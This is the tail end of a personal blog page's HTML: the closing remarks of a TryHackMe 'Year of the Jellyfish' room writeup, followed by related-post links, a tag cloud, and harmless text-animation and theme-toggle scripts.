+<p>And there we have it! That’s the room done. There were more things I could have explored, but I feel like it’d just be waffling to talk about how there weren’t vulnerabilities in other running services. I only included the first few services I looked at, because I wanted to show my thought process and the exact way I done this room :)</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/thats_all.png" /></p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/blog/discord-scammer-1">
+            Discord scammer #1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/THM-JPGchat-writeup">
+            TryHackMe! JPGchat room
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/misc-binexp-writeup">
+            Cool binary reversing stuff
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/crackme/" class="set-1">crackme</a> <a href="/tag/locks/" class="set-1">locks</a> <a href="/tag/misc/" class="set-4">misc</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/thm/" class="set-5">thm</a> <a href="/tag/tutorial/" class="set-2">tutorial</a> <a href="/tag/writeup/" class="set-2">writeup</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'An in depth writeup of the "year of the jellyfish room :)';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
